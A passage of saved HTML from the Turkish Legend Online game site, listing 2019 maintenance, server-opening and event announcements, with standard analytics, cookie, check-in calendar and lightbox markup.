                  <a href="/articlelist/news/key-3847" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    《Legend Online》7 Mayıs Bakım Duyurusu</p>
                        <span>05.07.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/news/key-3846" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Yeni Server Açılıyor （OAS 1035)</p>
                        <span>04.26.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/news/key-3845" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    《Legend Online》30 Nisan Bakım Duyurusu</p>
                        <span>04.26.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/news/key-3844" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Yeni Server Açılıyor （OAS 1034)</p>
                        <span>04.25.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/news/key-3843" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    《Legend Online》23 Nisan Bakım Duyurusu</p>
                        <span>04.22.2019</span>
                    </a>
                </li>
                            </ul>
        </div>
                            <div class="ncont por" style="display: none;">
          <a href="/articlelist/activity" onclick="_ga_track_event('lotr','lotrosite_Home-activity-more')" target="_blank" class="more poa"></a>
            <ul>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_11_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 11 Mayıs 2019</p>
                        <span>05.09.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_4_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 4 Mayıs 2019</p>
                        <span>04.30.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_2_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 2 Mayıs 2019</p>
                        <span>04.30.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_1_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 1 Mayıs 2019</p>
                        <span>04.30.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_27_nisan_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 27 Nisan 2019</p>
                        <span>04.26.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_22_nisan_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 22 Nisan 2019</p>
                        <span>04.22.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_20_nisan_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 20 Nisan 2019</p>
                        <span>04.19.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/activity/etkinlik_duyurusu_17_nisan_2019" onclick="_ga_track_event('lotr','lotrosite_Home-activity-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 17 Nisan 2019</p>
                        <span>04.16.2019</span>
                    </a>
                </li>
                            </ul>
        </div>
                            <div class="ncont por" style="display: none;">
          <a href="/articlelist/notice" onclick="_ga_track_event('lotr','lotrosite_Home-notice-more')" target="_blank" class="more poa"></a>
            <ul>
                            </ul>
        </div>
                    </div>
    <div class="ins" style="height: 359px; display: block;"><iframe src="https://img.oasgames.com/upload/1543920956/role/hero-list.html?gamecode=lotr" frameborder="0" scrolling="no" height="362" width="100%"></iframe></div>
                </div>
            </div>
                            <div class="box_footer">
                    <div class="box_footer_mark"></div>
                    <div class="box_footer_h">
                        <dl>
                            <dt><img src="https://cdn-img-odp3.oasgames.com/img/20181204/960e7339e22eee035a8b3daab3f2c4fe.png"></dt>
                            <dd>"Naruto Online", é o único jogo de RPG online oficial do Naruto. Baseado no Mangá e Anime, o RPG online, foi desenvolvido com autorização de Bandai Namco Entertainment &amp; publicado no Brasil com exclusividade por OASIS GAMES. Acesse agora o Jogo do Naruto no seu navegador, Naruto Online, e reviva toda essa saga como nunca antes.</dd>
                        </dl>
                    </div>
                </div>
                    </div>

    </div>

                        <script src="https://img.oasgames.com/upload/1544774292/lightbox.js"></script>
                    <script src="https://img.oasgames.com/upload/1543920993/entry.js"></script>
                    <script src="https://img.oasgames.com/upload/1544432575/lo-login.js"></script>
                <script type="text/javascript" src="//www.oasgames.com/?a=widget&amp;m=login_box&amp;lang=tr&amp;fb_app_id=340651019346903&amp;lang=tr"></script>

<div class="footer">
    <div class="footer_main clearfix">

                    <div class="oasgames_footer_center clearfix">
                <iframe src="//www.oasgames.com/?a=widget&amp;m=footer&amp;lang=tr&amp;gcode=lotr&amp;color&amp;lang=tr" style="float: right;width: 612px;" allowtransparency="true" frameborder="0" height="105" scrolling="no"></iframe>
            </div>
            </div>
</div>
<script type="text/javascript">

    (function (i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function () {
                    (i[r].q = i[r].q || []).push(arguments)
                }, i[r].l = 1 * new Date();
        a = s.createElement(o),
                m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

    ga('create', 'UA-33361405-2', 'auto');
    ga('send', 'pageview');

    _gaq = [];


    function _ga_track_pageview(trackUrl) {
        ga('send', 'pageview', {page: trackUrl});
    }

    function _ga_track_event(category, action) {
        ga('send', 'event', category, action);
    }

</script>
<script>
    var LanguageAreaCode = "tr-tr";
    function setLangCookie(cname, cvalue, exdays) {
        var d = new Date();
        d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
        var expires = "expires=" + d.toUTCString();
        document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/;domain=oasgames.com";
    }
    setLangCookie("oas_lp_language", LanguageAreaCode,30);
</script>



<div class="kalendar_menu"><div class="menu_title">Yoklama<span onclick="hideSign();"></span></div><div class="menu_center"><div id="wrap"><table id="kalendar">
<tbody><tr id="select">
<td colspan="7">
<div id="year">
<ul>
<li><input type="button" id="yearPrev" value="<<"></li>
<li class="selectChange">
<select name="year"><option value="1970">1970</option><option value="1971">1971</option><option value="1972">1972</option><option value="1973">1973</option><option value="1974">1974</option><option value="1975">1975</option><option value="1976">1976</option><option value="1977">1977</option><option value="1978">1978</option><option value="1979">1979</option><option value="1980">1980</option><option value="1981">1981</option><option value="1982">1982</option><option value="1983">1983</option><option value="1984">1984</option><option value="1985">1985</option><option value="1986">1986</option><option value="1987">1987</option><option value="1988">1988</option><option value="1989">1989</option><option value="1990">1990</option><option value="1991">1991</option><option value="1992">1992</option><option value="1993">1993</option><option value="1994">1994</option><option value="1995">1995</option><option value="1996">1996</option><option value="1997">1997</option><option value="1998">1998</option><option value="1999">1999</option><option value="2000">2000</option><option value="2001">2001</option><option value="2002">2002</option><option value="2003">2003</option><option value="2004">2004</option><option value="2005">2005</option><option value="2006">2006</option><option value="2007">2007</option><option value="2008">2008</option><option value="2009">2009</option><option value="2010">2010</option><option value="2011">2011</option><option value="2012">2012</option><option value="2013">2013</option><option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019" selected="true">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option></select>
</li>
<li><input type="button" id="yearNext" value=">>"></li>
</ul>
</div>
<div id="month">
<ul>
<li><input type="button" id="monthPrev" value=""></li>
<li class="selectChange"><h2 value="4">Mayıs</h2></li>
<li><input type="button" id="monthNext" value=""></li>
</ul>
</div>
<div id="time">
</div>
</td>
</tr>

<tr id="week">
<td>
<ul>
<li class="weekend">Pazar</li>
<li>Pazartesi</li>
<li>Salı</li>
<li>Çarşamba</li>
<li>Perşembe</li>
<li>Cuma</li>
<li class="weekend">Cumartesi</li>
</ul>
</td>
</tr>

<tr id="day">
<td colspan="7">
<ul class="dayList dayListHide0">
<li></li><li></li><li></li><li class="2019-05-1">1</li><li class="2019-05-2">2</li><li class="2019-05-3">3</li><li class="Weekend 2019-05-4">4</li></ul>
<ul class="dayList dayListHide1">
<li class="Weekend 2019-05-5">5</li><li class="2019-05-6">6</li><li class="2019-05-7">7</li><li class="2019-05-8">8</li><li class="2019-05-9">9</li><li class="2019-05-10">10</li><li class="Weekend 2019-05-11">11</li></ul>
<ul class="dayList dayListHide2">
<li class="Weekend 2019-05-12">12</li><li class="2019-05-13">13</li><li class="2019-05-14">14</li><li class="today 2019-05-15">15</li><li class="2019-05-16">16</li><li class="2019-05-17">17</li><li class="Weekend 2019-05-18">18</li></ul>
<ul class="dayList dayListHide3">
<li class="Weekend 2019-05-19">19</li><li class="2019-05-20">20</li><li class="2019-05-21">21</li><li class="2019-05-22">22</li><li class="2019-05-23">23</li><li class="2019-05-24">24</li><li class="Weekend 2019-05-25">25</li></ul>
<ul class="dayList dayListHide4">
<li class="Weekend 2019-05-26">26</li><li class="2019-05-27">27</li><li class="2019-05-28">28</li><li class="2019-05-29">29</li><li class="2019-05-30">30</li><li class="2019-05-31">31</li><li></li></ul>
<ul class="dayList hide dayListHide5">
<li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul>
</td>
</tr>
</tbody></table></div><p><span>Bu Ayki Toplam Yoklama:<b id="times"></b>Gün</span></p><div class="rule"><h6>Yoklama Kuralı锛�</h6><ul><li>Günlük yoklamadan 3 puan kazanılır</li><li>7 günlük yoklamadan ekstra 10 puan kazanılır.</li><li>15 günlük yoklamadan ekstra 23 puan kazanılır.</li><li>Tüm ay yoklama alındığında ekstra 50 puan kazanılır.</li></ul></div></div><div class="menu_bot"></div></div><div id="lightboxOverlay" class="lightboxOverlay" style="display: none;"></div><div id="lightbox" class="lightbox" style="display: none;"><div class="lb-outerContainer"><div class="lb-container"><img class="lb-image" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="><div class="lb-video"></div><a class="lb-prev" href=""></a><a class="lb-next" href=""></a><div class="lb-loader"><a class="lb-cancel"></a></div><a class="lb-close"></a></div></div><div class="lb-dataContainer"><div class="lb-data"><div class="lb-details"><span class="lb-caption"></span><span class="lb-number"></span></div><div class="lb-closeContainer"><a class="lb-close"></a></div></div></div></div><div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" src="https://staticxx.facebook.com/connect/xd_arbiter/r/d_vbiawPdxB.js?version=44#channel=f13611a3a5cb32&amp;origin=https%3A%2F%2Flotr.oasgames.com" style="border: none;"></iframe></div><div></div></div></div></body></html>